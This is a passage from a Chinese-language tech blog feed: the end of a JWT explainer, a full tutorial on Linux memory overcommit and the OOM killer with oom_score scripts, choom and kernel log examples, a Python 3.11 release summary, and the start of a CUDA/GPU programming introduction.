<h3 id="把所有放在一起"><a href="#把所有放在一起" class="headerlink" title="把所有放在一起"></a>把所有放在一起</h3><p>输出是由点分隔的三个 Base64-URL 字符串，可以在 HTML 和 HTTP 环境中轻松传递，同时与基于 XML 的标准（如 SAML）相比更加紧凑。</p>
<p>下面显示了一个 JWT，它对前面的标头和有效负载进行了编码，并使用秘密进行了签名。</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI<span class="number">1</span><span class="symbol">NiIsInR5</span>cCI<span class="number">6</span>IkpX<span class="attr">VCJ9</span>.eyJzdWIiOiIxMj<span class="name">M0</span><span class="symbol">NTY3</span>ODkwIiwibmFtZSI<span class="number">6</span>Ikpva<span class="name">G4</span>gR<span class="name">G9</span>lIiwiaWF<span class="number">0</span>Ijox<span class="symbol">NTE2</span>Mj<span class="name">M5</span>MDIyfQ.SflKxwRJSMeKKF<span class="number">2</span>QT<span class="number">4</span>fwpMeJf<span class="number">36</span>POk<span class="number">6</span>yJV_adQssw<span class="number">5</span>c</span><br></pre></td></tr></table></figure>

<p>如果您想使用 JWT 并将这些概念付诸实践，您可以使用 <span class="exturl" data-url="aHR0cHM6Ly9qd3QuaW8vI2RlYnVnZ2VyLWlv">jwt.io Debugger<i class="fa fa-external-link-alt"></i></span> 来解码、验证和生成 JWT。</p>
<h2 id="JSON-Web-令牌如何工作？"><a href="#JSON-Web-令牌如何工作？" class="headerlink" title="JSON Web 令牌如何工作？"></a>JSON Web 令牌如何工作？</h2><p>在身份验证中，当用户使用其凭据成功登录时，将返回一个 JSON Web Token。由于令牌是凭据，因此必须非常小心以防止出现安全问题。通常，您不应将令牌保留的时间超过要求的时间。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9IVE1MNV9TZWN1cml0eV9DaGVhdF9TaGVldC5odG1sI2xvY2FsLXN0b3JhZ2U=">由于缺乏安全性<i class="fa fa-external-link-alt"></i></span> 您也不应该将敏感的会话数据存储在浏览器存储中。</p>
<p>每当用户想要访问受保护的路由或资源时，用户代理都应该发送 JWT，通常在使用<strong>Bearer</strong>模式的<strong>Authorization标头中。</strong>标头的内容应如下所示：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Authorization: Bearer <span class="tag">&lt;<span class="name">token</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在某些情况下，这可以是无状态授权机制。服务器的受保护路由将检查<code>Authorization</code>标头中是否存在有效的 JWT，如果存在，则允许用户访问受保护的资源。如果 JWT 包含必要的数据，则可能会减少为某些操作查询数据库的需要，尽管情况可能并非总是如此。</p>
<p>请注意，如果您通过 HTTP 标头发送 JWT 令牌，您应该尽量防止它们变得太大。有些服务器不接受超过 8 KB 的标头。如果您试图在 JWT 令牌中嵌入太多信息，例如通过包含所有用户的权限，您可能需要一个替代解决方案，例如 <span class="exturl" data-url="aHR0cHM6Ly9mZ2EuZGV2Lw==">Auth0 Fine-Grained Authorization<i class="fa fa-external-link-alt"></i></span>。</p>
<p>如果令牌在<code>Authorization</code>标头中发送，跨源资源共享 (CORS) 将不会成为问题，因为它不使用 cookie。</p>
<p>如何获取 JWT 并将其用于访问 API 或资源？</p>
<ol>
<li>应用程序或客户端向授权服务器请求授权。这是通过不同的授权流程之一执行的。例如，典型的 <span class="exturl" data-url="aHR0cDovL29wZW5pZC5uZXQvY29ubmVjdC8=">OpenID Connect<i class="fa fa-external-link-alt"></i></span> 兼容 Web 应用程序将使用 <span class="exturl" data-url="aHR0cDovL29wZW5pZC5uZXQvc3BlY3Mvb3BlbmlkLWNvbm5lY3QtY29yZS0xXzAuaHRtbCNDb2RlRmxvd0F1dGg=">授权代码流<i class="fa fa-external-link-alt"></i></span> <code>/oauth/authorize</code> 通过端点。</li>
<li>授予授权后，授权服务器会向应用程序返回一个访问令牌。</li>
<li>应用程序使用访问令牌访问受保护的资源（如 API）。</li>
</ol>
<p>请注意，对于已签名的令牌，令牌中包含的所有信息都会暴露给用户或其他方，即使他们无法更改。这意味着您不应将秘密信息放入令牌中。</p>
<h2 id="我们为什么要使用-JSON-Web-Tokens？"><a href="#我们为什么要使用-JSON-Web-Tokens？" class="headerlink" title="我们为什么要使用 JSON Web Tokens？"></a>我们为什么要使用 JSON Web Tokens？</h2><p>让我们谈谈 <strong>JSON Web 令牌 (JWT)</strong> 与 <strong>简单网络令牌 (SWT)</strong> 和 <strong>安全断言标记语言令牌 (SAML)</strong> 相比的优势。</p>
<p>由于 JSON 比 XML 更简洁，因此在编码时它的大小也更小，使 JWT 比 SAML 更紧凑。这使得 JWT 成为在 HTML 和 HTTP 环境中传递的不错选择。</p>
<p>安全方面，SWT 只能通过使用 HMAC 算法的共享密钥进行对称签名。但是，JWT 和 SAML 令牌可以使用 X.509 证书形式的公钥&#x2F;私钥对进行签名。与签署 JSON 的简单性相比，使用 XML 数字签名签署 XML 而不引入模糊的安全漏洞是非常困难的。</p>
<p>JSON 解析器在大多数编程语言中都很常见，因为它们直接映射到对象。相反，XML 没有自然的文档到对象的映射。这使得使用 JWT 比使用 SAML 断言更容易。</p>
<p>关于使用，JWT 用于互联网规模。这凸显了客户端在多个平台（尤其是移动平台）上处理 JSON Web 令牌的便利性。</p>
]]></content>
      <categories>
        <category>DevSecurity</category>
      </categories>
      <tags>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 内存 Overcommit 和 OOM Killer</title>
    <url>/2022/11/linux-oom/</url>
    <content><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>Linux 操作系统有特定的内存管理方式。其中一项策略是Overcommit，它允许应用程序提前预订所需的内存。然而，承诺的内存在实际使用时可能无法使用。然后，系统必须提供一种特殊的方法来避免内存不足。</p>
<p>在本教程中，我们将了解内存不足 (OOM) Killer，这是一个为了系统稳定性而消除应用程序的过程。</p>
<span id="more"></span>

<h2 id="2-OOM-Killer调用时"><a href="#2-OOM-Killer调用时" class="headerlink" title="2. OOM Killer调用时"></a>2. OOM Killer调用时</h2><p>让我们注意到，要让Killer发挥作用，系统必须允许Overcommit。然后，根据系统从消除它中获得的收益对每个进程进行评分。</p>
<p>最后，当遇到低内存状态时，内核会杀死得分最高的进程。</p>
<p>我们可以在&#x2F;proc&#x2F;PID&#x2F;oom_score文件中通过进程的PID找到进程的分数。现在，让我们启动一个终端并打印它的进程分数，因为$$变量保存它的PID：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> <span class="built_in">cat</span> /proc/<span class="variable">$</span><span class="variable">$</span>/oom_score</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>接下来，让我们列出所有进程及其PID和名称，按oom_score从低到高排序，使用oom_score_reader脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> -r pid <span class="built_in">comm</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&#x27;%d\t%d\t%s\n&#x27;</span> <span class="string">&quot;<span class="variable">$pid</span>&quot;</span> <span class="string">&quot;<span class="subst">$(cat /proc/$pid/oom_score)</span>&quot;</span> <span class="string">&quot;<span class="variable">$comm</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; &lt;(ps -e -o pid= -o <span class="built_in">comm</span>=) | <span class="built_in">sort</span> -k2 -n</span><br></pre></td></tr></table></figure>

<p>我们使用进程替换来为读取命令提供ps的结果。</p>
<p>现在让我们检查一下结果：</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">10     <span class="number"> 0 </span>      rcu_sched</span><br><span class="line">102    <span class="number"> 0 </span>      kswapd0</span><br><span class="line">...</span><br><span class="line">97     <span class="number"> 0 </span>      devfreq_wq</span><br><span class="line">99     <span class="number"> 0 </span>      watchdogd</span><br><span class="line">1051   <span class="number"> 1 </span>      upowerd</span><br><span class="line">1114   <span class="number"> 1 </span>      sddm-helper</span><br><span class="line">1126   <span class="number"> 1 </span>      systemd</span><br><span class="line">...</span><br><span class="line">1147   <span class="number"> 2 </span>      pulseaudio</span><br><span class="line">2005   <span class="number"> 2 </span>      gnome-shell-cal</span><br><span class="line">2172   <span class="number"> 2 </span>      gsd-datetime</span><br><span class="line">...</span><br><span class="line">4329   <span class="number"> 6 </span>      gedit</span><br><span class="line">2186   <span class="number"> 7 </span>      evolution-alarm</span><br><span class="line">5300   <span class="number"> 9 </span>      qterminal</span><br><span class="line">875    <span class="number"> 9 </span>      Xorg</span><br><span class="line">9215   <span class="number"> 10 </span>     Web Content</span><br><span class="line">3527   <span class="number"> 17 </span>     Privileged Cont</span><br><span class="line">6353   <span class="number"> 19 </span>     Web Content</span><br><span class="line">1679   <span class="number"> 20 </span>     gnome-shell</span><br><span class="line">6314   <span class="number"> 21 </span>     Web Content</span><br><span class="line">8625   <span class="number"> 21 </span>     Web Content</span><br><span class="line">4070   <span class="number"> 22 </span>     Web Content</span><br><span class="line">7753   <span class="number"> 23 </span>     Web Content</span><br><span class="line">3170   <span class="number"> 27 </span>     gnome-software</span><br><span class="line">3615   <span class="number"> 41 </span>     WebExtensions</span><br><span class="line">3653   <span class="number"> 41 </span>     Web Content</span><br><span class="line">3160   <span class="number"> 62 </span>     firefox</span><br></pre></td></tr></table></figure>

<p>分数取值从 0 到 1000。让我们注意oom_score的值为零意味着该进程对于 OOM Killer是安全的。</p>
<h2 id="3-保护进程免受-OOM-Killer-攻击"><a href="#3-保护进程免受-OOM-Killer-攻击" class="headerlink" title="3. 保护进程免受 OOM Killer 攻击"></a>3. 保护进程免受 OOM Killer 攻击</h2><p>现在，让我们降低消除该过程的可能性。这对于长期存在的流程和服务尤为重要。所以，对于这样一个过程，我们应该设置oom_score_adj参数。</p>
<p>该参数取值范围从 -1000 到 1000（含）。因此，它的负值会降低oom_score，使该过程对Killer的吸引力降低。相反，正值会导致分数上升。最后，oom_score_adj &#x3D; -1000的进程不会被杀死。</p>
<p>我们应该检查文件&#x2F;proc&#x2F;PID&#x2F;oom_score_adj 中的参数。所以，对于我们的终端：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> <span class="built_in">cat</span> /proc/<span class="variable">$</span><span class="variable">$</span>/oom_score_adj</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>让我们看看终端的分数在任何一个方向上都没有调整。</p>
<h3 id="3-1-手动设置oom-score-adj"><a href="#3-1-手动设置oom-score-adj" class="headerlink" title="3.1. 手动设置oom_score_adj"></a>3.1. 手动设置oom_score_adj</h3><p>作为最简单的方法，我们可以手动写入oom_score_adj文件。首先，让我们检查一下Firefox网络浏览器进程的分数。我们需要pgrep来获取它的PID：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /proc/$(pgrep firefox)/oom_score</span></span><br><span class="line">60</span><br></pre></td></tr></table></figure>

<p>接下来，让我们让它更容易被杀死：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> 500 &gt; /proc/$(pgrep firefox)/oom_score_adj</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /proc/$(pgrep firefox)/oom_score</span></span><br><span class="line">562</span><br></pre></td></tr></table></figure>

<p>最后，让我们提高它的安全性：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">echo</span> -30 &gt; /proc/$(pgrep firefox)/oom_score_adj</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /proc/$(pgrep firefox)/oom_score</span></span><br><span class="line">31</span><br></pre></td></tr></table></figure>

<p>请注意，我们需要sudo权限才能将调整因子降低到零以下。</p>
<h3 id="3-2-choom命令"><a href="#3-2-choom命令" class="headerlink" title="3.2. choom命令"></a>3.2. choom命令</h3><p>我们应该使用choom来报告分数并修改其调整。该命令是util-linux软件包的一部分。因此，让我们使用p开关再次检查Firefox进程：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>choom -p <span class="variable">$(</span>pgrep firefox)</span><br><span class="line"></span><br><span class="line">pid <span class="number">3061</span><span class="string">&#x27;s current OOM score: 40</span></span><br><span class="line"><span class="string">pid 3061&#x27;</span>s current <span class="title class_">OOM</span> score adjust <span class="symbol">value:</span> <span class="number">-30</span></span><br></pre></td></tr></table></figure>

<p>然后，让我们通过n开关提供oom_score_adj的新值来增加它的分数：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">$ choom -p $(pgrep firefox) -<span class="keyword">n</span> 300</span><br><span class="line">pid 3061&#x27;s OOM <span class="keyword">score</span> <span class="keyword">adjust</span> value changed from -30 to 300</span><br><span class="line"></span><br><span class="line">$ choom -p $(pgrep firefox)</span><br><span class="line">pid 3061&#x27;s current OOM <span class="keyword">score</span>: 371</span><br><span class="line">pid 3061&#x27;s current OOM <span class="keyword">score</span> <span class="keyword">adjust</span> value: 300</span><br></pre></td></tr></table></figure>

<p>最后，使用choom，我们可以使用给定的 oom_score_adj 立即启动一个进程：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>choom -n <span class="number">300</span> firefox</span><br><span class="line"></span><br><span class="line"><span class="variable">$ </span>choom -p <span class="variable">$(</span>pgrep firefox)</span><br><span class="line">pid <span class="number">3061</span><span class="string">&#x27;s current OOM score: 346</span></span><br><span class="line"><span class="string">pid 3061&#x27;</span>s current <span class="title class_">OOM</span> score adjust <span class="symbol">value:</span> <span class="number">300</span></span><br></pre></td></tr></table></figure>

<h3 id="3-3-配置服务"><a href="#3-3-配置服务" class="headerlink" title="3.3. 配置服务"></a>3.3. 配置服务</h3><p>对于服务，我们可以永久调整位于或链接在&#x2F;etc&#x2F;systemd文件夹中的服务配置中的分数。因此，我们需要编辑服务部分中的OOMScoreAdjust条目。例如，让我们看一下snapd服务的配置：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Snap Daemon</span><br><span class="line"></span><br><span class="line"><span class="comment"># some output skipped</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># some output skipped</span></span><br><span class="line"></span><br><span class="line"><span class="attr">OOMScoreAdjust</span>=-<span class="number">900</span></span><br><span class="line"><span class="attr">ExecStart</span>=/usr/lib/snapd/snapd</span><br><span class="line"></span><br><span class="line"><span class="comment"># more output skipped</span></span><br></pre></td></tr></table></figure>

<h2 id="4-oom-score是如何计算的"><a href="#4-oom-score是如何计算的" class="headerlink" title="4. oom_score是如何计算的"></a>4. oom_score是如何计算的</h2><p>我们应该知道，分数的计算方式取决于内核版本。除了内存占用之外，旧版本可能会考虑运行时间、nice级别或 root 所有权。</p>
<p>然而，在版本 5 中，只有总内存使用量很重要。要找到它，我们应该检查<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvdjUuNC41OC9zb3VyY2UvbW0vb29tX2tpbGwuYw==">oom_kill.c<i class="fa fa-external-link-alt"></i></span>源文件中的函数oom_badness 。</p>
<p>首先，函数检查进程是否免疫。通常，这要归功于oom_score_adj &#x3D; -1000。在这种情况下，任务获得零分。</p>
<p>否则，将汇总任务的 RAM、虚拟内存和交换空间大小。然后将结果除以总可用内存。最后，该函数将比率归一化为1000。</p>
<p>这时，oom_score_adj就派上用场了。所以，它增加了分数。因此，它的负值实际上降低了这个值。</p>
<p>现在我们应该意识到，如果这个过程对我们很重要，我们需要自己照顾它的生存能力。因此，我们应该适当调整它的oom_score_adj参数。</p>
<h2 id="5-控制Overcommit的系统范围参数"><a href="#5-控制Overcommit的系统范围参数" class="headerlink" title="5. 控制Overcommit的系统范围参数"></a>5. 控制Overcommit的系统范围参数</h2><p>我们可以通过设置overcommit_memory参数来改变Linux系统的Overcommit策略。该参数在&#x2F;proc&#x2F;sys&#x2F;vm&#x2F;overcommit_memory文件中并采用：</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">0 </span>允许适度的Overcommit。但是，不合理的内存分配会失败。这是默认设置</span><br><span class="line"><span class="symbol">1 </span>总是Overcommit</span><br><span class="line"><span class="symbol">2 </span>不允许Overcommit。进程通常不会被 OOM Killer终止，但内存分配尝试可能会返回错误</span><br></pre></td></tr></table></figure>

<p>我们应该意识到，使用默认策略以外的策略会对应用程序处理内存的方式提出更高的要求。</p>
<h2 id="6-示范"><a href="#6-示范" class="headerlink" title="6. 示范"></a>6. 示范</h2><p>现在让我们展示 OOM Killer是如何工作的。因此，让我们模拟具有高内存消耗的进程。然而，他们不应该单独耗尽系统的能力。然后，只有启动下一个进程才会被检测为内存不足威胁。</p>
<p>所以，让我们使用测试脚本来吃内存：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> &#123;0..6999999&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    y=$x<span class="variable">$y</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>让我们注意到脚本分配了大量内存但没有任何尖峰需求。因此，它的内存使用水平很快。</p>
<p>该演示是在 Ubuntu 20.04 LTS 上进行的，内核为 5.4.0-58-generic，具有大约 4 GB 的内存和 4 GB 的交换空间。通常，系统最多可以维持三个测试应用程序同时运行。然后，开始第四个实例，唤醒 OOM killer。</p>
<h3 id="6-1-记录进程的oom-score"><a href="#6-1-记录进程的oom-score" class="headerlink" title="6.1. 记录进程的oom_score"></a>6.1. 记录进程的oom_score</h3><p>因为进程的oom_score没有出现在内核的日志中，我们需要基于cron设备一个简单的记录器。因此，让我们使用oom_score_reader每分钟记录五个得分最高的进程：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crontab -l</span><br><span class="line"><span class="comment">#some output skipped</span></span><br><span class="line"></span><br><span class="line">OOMTEST=/home/joe/prj/oom</span><br><span class="line">*/1 * * * * <span class="variable">$OOMTEST</span>/./oom_score_reader | <span class="built_in">tail</span> -n 5&lt;br /&gt;  &gt;&gt; <span class="variable">$OOMTEST</span>/oom_score.log &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;-------------&quot;</span> &gt;&gt; <span class="variable">$OOMTEST</span>/oom_score.log</span><br></pre></td></tr></table></figure>

<h3 id="6-2-追踪-OOM-Killer"><a href="#6-2-追踪-OOM-Killer" class="headerlink" title="6.2. 追踪 OOM Killer"></a>6.2. 追踪 OOM Killer</h3><p>由于我们已经在终端中开始了我们的任务，所以在某个时候，我们将在其中一个终端中获取一条消息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test</span></span><br><span class="line">Killed</span><br></pre></td></tr></table></figure>

<p>让我们在kern.log中寻找相应的事件：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">grep</span> -<span class="keyword">ia</span> <span class="string">&quot;Killed process&quot;</span> kern.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">Jul  <span class="number">7</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">56</span> virtual kernel: [ <span class="number">7269.971178</span>] Out of memory: Killed process <span class="number">20257</span> (test) total-<span class="keyword">vm</span>:<span class="number">1980996</span>kB,&lt;<span class="keyword">br</span> /&gt;  anon-rs<span class="variable">s:21128kB</span>, <span class="keyword">file</span>-rs<span class="variable">s:0kB</span>, shmem-rs<span class="variable">s:0kB</span>, UID:<span class="number">1000</span> pgtable<span class="variable">s:3920kB</span> oom_score_adj:<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>然后让我们获取有关PID 20257的更多信息：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">Jul  <span class="number">7</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">56</span> virtual kernel: [ <span class="number">7269.971162</span>] oom-kil<span class="variable">l:constraint</span>=CONSTRAINT_NONE,&lt;<span class="keyword">br</span> /&gt;  nodemask=(null),cpuset=/,mems_allowed=<span class="number">0</span>,global_oom,task_memcg=/user.slice/user-<span class="number">1000</span>.slice/user@<span class="number">1000</span>.service,task=test,pid=<span class="number">20257</span>,uid=<span class="number">1000</span></span><br><span class="line">Jul  <span class="number">7</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">56</span> virtual kernel: [ <span class="number">7269.971178</span>] Out of memory: Killed process <span class="number">20257</span> (test) total-<span class="keyword">vm</span>:<span class="number">1980996</span>kB,&lt;<span class="keyword">br</span> /&gt;  anon-rs<span class="variable">s:21128kB</span>, <span class="keyword">file</span>-rs<span class="variable">s:0kB</span>, shmem-rs<span class="variable">s:0kB</span>, UID:<span class="number">1000</span> pgtable<span class="variable">s:3920kB</span> oom_score_adj:<span class="number">0</span></span><br><span class="line">Jul  <span class="number">7</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">56</span> virtual kernel: [ <span class="number">7270.002859</span>] oom_reaper: reaped process <span class="number">20257</span> (test),&lt;<span class="keyword">br</span> /&gt;  now anon-rs<span class="variable">s:0kB</span>, <span class="keyword">file</span>-rs<span class="variable">s:0kB</span>, shmem-rs<span class="variable">s:0kB</span></span><br></pre></td></tr></table></figure>

<p>在这里，oom-reaper是一个回收内存的辅助进程。最后，我们可以在日志文件中找到进程的最后oom_score ：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1537</span>	<span class="number">13</span>	gnome-shell</span><br><span class="line"><span class="attribute">2361</span>	<span class="number">24</span>	gnome-software</span><br><span class="line"><span class="attribute">20256</span>	<span class="number">235</span>	test</span><br><span class="line"><span class="attribute">20257</span>	<span class="number">235</span>	test</span><br><span class="line"><span class="attribute">24214</span>	<span class="number">236</span>	test</span><br></pre></td></tr></table></figure>

<p>让我们看看20257的最后得分235在记录时是第二高的。然而，这是由于cron的粒度大至 1 分钟。</p>
<h2 id="7-结论"><a href="#7-结论" class="headerlink" title="7. 结论"></a>7. 结论</h2><p>在本教程中，我们了解了 Linux 管理内存的方法。首先，我们查看了Overcommit策略，它允许任何合理的内存分配。然后我们遇到了 OOM Killer，在内存不足时保护系统稳定的进程。</p>
<p>接下来，我们查看了进程的内存使用情况评分，并了解了如何保护它们免受 OOM Killer的攻击。此外，我们还查看了系统范围的Overcommit设置。</p>
<p>最后，我们提供了一个 OOM Killer如何工作的例子。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>Python 3.11.0 发布 —— 对数据科学和工程的影响</title>
    <url>/2022/11/python-3.11.0/</url>
    <content><![CDATA[<h2 id="新版本的优势是什么？"><a href="#新版本的优势是什么？" class="headerlink" title="新版本的优势是什么？"></a>新版本的优势是什么？</h2><p>Python 3.11.0 发布了 Python 编程语言的新主要版本。它包含许多新功能和优化。</p>
<p>问题是对数据科学和数据工程师领域的程序员和企业家有什么好处——让我们来看看吧！</p>
<span id="more"></span>

<h2 id="更好的性能"><a href="#更好的性能" class="headerlink" title="更好的性能"></a>更好的性能</h2><p>Python 将被归类为慢速语言。例如，Python 中的常规循环比 C 中的类似循环慢几个数量级。新版本和<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zhc3Rlci1jcHl0aG9uLw==">更快的 CPython 项目<i class="fa fa-external-link-alt"></i></span>已经产生了一些令人兴奋的结果。Python 3.11 比 Python 3.10[1] 快 10–60%。我认为这种改进应该让每个人和数据领域的用户都满意——更好的性能在大数据领域总是一件好事。</p>
<h2 id="键入和键入语言更改"><a href="#键入和键入语言更改" class="headerlink" title="键入和键入语言更改"></a>键入和键入语言更改</h2><p>Python 是一种动态类型语言，但它也支持静态类型。在 Python 3.11.0 [1][2] 的这个版本中，现在有五个新的与类型相关的 PEP：</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9wZXBzLnB5dGhvbi5vcmcvcGVwLTA2NDY=">PEP 646<i class="fa fa-external-link-alt"></i></span>：可变参数泛型</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9wZXBzLnB5dGhvbi5vcmcvcGVwLTA2NTU=">PEP 655<i class="fa fa-external-link-alt"></i></span>：将单个项目标记<code>TypedDict</code>为需要或可能丢失</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9wZXBzLnB5dGhvbi5vcmcvcGVwLTA2NzM=">PEP 673<i class="fa fa-external-link-alt"></i></span>：<code>Self</code>类型</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9wZXBzLnB5dGhvbi5vcmcvcGVwLTA2NzU=">PEP 675<i class="fa fa-external-link-alt"></i></span>：任意文字字符串类型</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9wZXBzLnB5dGhvbi5vcmcvcGVwLTA2ODE=">PEP 681<i class="fa fa-external-link-alt"></i></span>：数据类转换</li>
</ul>
<h2 id="更好的错误回溯"><a href="#更好的错误回溯" class="headerlink" title="更好的错误回溯"></a>更好的错误回溯</h2><p>通过更好的错误回溯，您现在可以更好地解释 Python 遇到错误时显示的回溯。这对 Python 新手特别有用。与 Python 3.10 一样，Python 的错误消息也得到了极大的改进，Python 3.11 最令人期待的特性也将让生活变得更轻松。将装饰性注释添加到回溯中，可以帮助您更快地解释错误消息 [2]。</p>
<p>Python 中的错误回溯示例 — 图片来源!</p>
<h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>所以这些是 Python 3.11.0 带来的一些新特性，我觉得特别有趣。其余的都可以在官方网站上找到。</p>
<p><a href="https://www.python.org/downloads/release/python-3110"><strong>Python 发布 Python 3.11.0</strong></a>，发布日期：2022 年 10 月 24 日 Python 3.11.0 是 Python 编程语言的最新主要版本。</p>
<p>在没有明确改进数据科学或数据工程的情况下，不得不说这些新功能应该对所有人都有帮助，包括在数据领域工作的人。要利用这些优势，您或您的 IT 同事应快速更新到新版本。</p>
<h2 id="来源和进一步阅读"><a href="#来源和进一步阅读" class="headerlink" title="来源和进一步阅读"></a>来源和进一步阅读</h2><p>[1] python.org，<span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kb3dubG9hZHMvcmVsZWFzZS9weXRob24tMzExMA==">Python 3.11.0<i class="fa fa-external-link-alt"></i></span> (2022)</p>
<p>[2] 真正的 Python，<span class="exturl" data-url="aHR0cHM6Ly9yZWFscHl0aG9uLmNvbS9weXRob24zMTEtbmV3LWZlYXR1cmVzLyNpbXByb3ZlZC10eXBlLXZhcmlhYmxlcw==">改进的类型变量<i class="fa fa-external-link-alt"></i></span>(2022)</p>
<p>[3] python.org, <span class="exturl" data-url="aHR0cHM6Ly9wZXBzLnB5dGhvbi5vcmcvcGVwLTA2NTc=">PEP 657 — 在 Tracebacks 中包含细粒度错误位置<i class="fa fa-external-link-alt"></i></span>(2022)</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>GPU 编程：CUDA 和 Python 中的实际示例</title>
    <url>/2022/11/python-cuda/</url>
    <content><![CDATA[<h2 id="什么是-GPU-编程？"><a href="#什么是-GPU-编程？" class="headerlink" title="什么是 GPU 编程？"></a>什么是 GPU 编程？</h2><p>GPU 计算是使用图形处理单元 (graphics processing unit) 来执行曾经由中央处理单元 (central processing unit) 处理的高度并行的独立计算。</p>
<p>GPU 编程是一种在 GPU 加速器上运行高度并行的通用计算的方法。</p>
<span id="more"></span>

<p>虽然过去的 GPU 专为计算机图形设计，但如今它们也被广泛用于通用计算。除了图形渲染，GPU 驱动的并行计算现在还用于科学建模、机器学习和其他需要并行化的工作。</p>
<h2 id="CPU-与-GPU-计算差异"><a href="#CPU-与-GPU-计算差异" class="headerlink" title="CPU 与 GPU 计算差异"></a>CPU 与 GPU 计算差异</h2><p>中央处理器 (CPU) 是延迟优化的通用处理器，旨在按顺序处理各种不同的任务，而图形处理单元 (GPU) 是吞吐量优化的专用处理器，专为高端并行设计计算。</p>
<p>您是否需要 GPU 加速器的问题归结为您要解决的问题的具体情况。CPU 和 GPU都有不同的优势领域，了解它们的局限性会让你在决定是否为你的项目使用 GPU 编程时做得更好。</p>
<h2 id="GPU-编程-API"><a href="#GPU-编程-API" class="headerlink" title="GPU 编程 API"></a>GPU 编程 API</h2><p>GPU 根据图元理解计算问题。如今，有多种可用的编程框架可以在幕后为您操作这些原语，因此您可以专注于更高级别的计算概念。</p>
<h3 id="CUDA"><a href="#CUDA" class="headerlink" title="CUDA"></a>CUDA</h3><p>计算统一设备架构 (CUDA) 是 Nvidia 于 2006 年创建的并行计算平台和应用程序编程接口 (API)，可直接访问 GPU 的虚拟指令集以执行计算内核。</p>
<p>内核是在 GPU 上运行的函数。当我们启动内核时，它做为一组线程执行。每个线程都映射到 GPU 上的单个 CUDA 内核，并对数据子集执行相同的操作。根据<span class="exturl" data-url="aHR0cHM6Ly93d3cuY2hlcnJ5c2VydmVycy5jb20vYmxvZy9ldmVyeXRoaW5nLXlvdS1uZWVkLXRvLWtub3ctYWJvdXQtZ3B1LWFyY2hpdGVjdHVyZQ==">Flynn 的分类法<i class="fa fa-external-link-alt"></i></span>，它是一种单指令多数据 (SIMD) 计算。</p>
